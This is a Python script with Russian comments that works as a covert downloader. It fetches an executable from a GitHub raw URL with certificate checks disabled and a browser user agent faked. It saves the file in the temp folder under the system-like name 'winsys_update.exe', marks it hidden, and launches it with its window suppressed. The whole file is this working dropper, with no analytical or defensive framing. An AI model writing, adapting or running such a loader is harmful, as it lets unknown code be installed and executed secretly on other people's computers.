import os
import tempfile
import urllib.request
import subprocess
import threading
import ssl
import time

def download_and_run_hidden(url):
    """
    Функция для скрытой загрузки файла по URL и его запуска.
    """
    try:
        # --- 1. Настройка скрытой загрузки ---
        # Отключаем проверку SSL-сертификата (для обхода ошибок, НЕ ДЕЛАЙТЕ ТАК В ОБЫЧНЫХ СКРИПТАХ)
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        # Заголовки, чтобы имитировать браузер
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        request = urllib.request.Request(url, headers=headers)

        # Создаем временный файл в системной TEMP-папке со скрытым именем
        temp_dir = tempfile.gettempdir()
        # Имя файла маскируется под системное
        file_path = os.path.join(temp_dir, "winsys_update.exe")

        print(f"[*] Начинаю фоновую загрузку из: {url}")
        print(f"[*] Файл будет сохранен как: {file_path}")

        # --- 2. Загрузка файла ---
        with urllib.request.urlopen(request, context=ssl_context, timeout=30) as response:
            # Получаем размер файла для прогресса (опционально)
            total_size = int(response.headers.get('Content-Length', 0))
            downloaded = 0
            with open(file_path, 'wb') as out_file:
                while True:
                    chunk = response.read(8192)
                    if not chunk:
                        break
                    out_file.write(chunk)
                    downloaded += len(chunk)
                    if total_size > 0:
                        # Печатаем прогресс в консоль (не скрыто, но полезно для отладки)
                        percent = (downloaded / total_size) * 100
                        print(f"\r  Прогресс: {percent:.1f}%", end='', flush=True)

        print(f"\n[+] Загрузка успешно завершена!")

        # --- 3. Делаем файл скрытым (только для Windows) ---
        if os.name == 'nt':
            import ctypes
            # Устанавливаем атрибут FILE_ATTRIBUTE_HIDDEN (0x2)
            ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
            print("[+] Файлу присвоен атрибут 'Скрытый'.")

        # --- 4. Запуск файла в скрытом режиме ---
        print("[*] Запуск файла в скрытом режиме...")
        if os.name == 'nt':  # Windows
            # Используем STARTUPINFO для скрытия окна
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE

            process = subprocess.Popen(
                [file_path],
                startupinfo=startupinfo,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                shell=True
            )
        else:  # Linux/macOS (менее вероятно для .exe, но на всякий случай)
            os.chmod(file_path, 0o755)
            process = subprocess.Popen(
                [file_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        print(f"[+] Процесс запущен (PID: {process.pid}).")

    except Exception as e:
        print(f"[-] Произошла ошибка: {e}")

# --- ЗАПУСК (замените URL на нужный, если требуется) ---
if __name__ == "__main__":
    # ВАЖНО: Проверьте, что URL ведет ПРЯМО к файлу (например, raw.githubusercontent.com)
    file_url = "https://github.com/gdshfdeq/fgdgafq3rqdfsfsd/raw/main/snoser.exe"
    
    # Запускаем загрузку и запуск в отдельном потоке, чтобы не блокировать основной
    thread = threading.Thread(target=download_and_run_hidden, args=(file_url,))
    thread.start()
    
    # Здесь могла бы быть основная программа, но в этом примере просто ждем
    print("Главная программа продолжает работу...")
    thread.join() # Ждем завершения загрузки и запуска
    print("Работа скрипта завершена.")